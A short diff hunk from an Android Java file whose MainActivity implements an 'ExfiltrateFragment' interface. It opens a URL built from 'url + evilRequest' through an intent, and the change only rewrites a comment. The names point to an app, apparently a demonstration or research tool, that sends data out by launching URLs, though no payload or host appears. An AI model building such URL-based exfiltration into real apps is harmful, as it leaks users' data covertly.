@@ -283,7 +283,7 @@ public class MainActivity extends AppCompatActivity implements ExfiltrateFragmen
             Uri.parse(url + evilRequest)
         );
         if (intent.resolveActivity(getPackageManager()) != null) {
-            // FIXME: Why
+            // Start the intent only if an app is able to handle it 
             startActivity(intent);
         }
     }
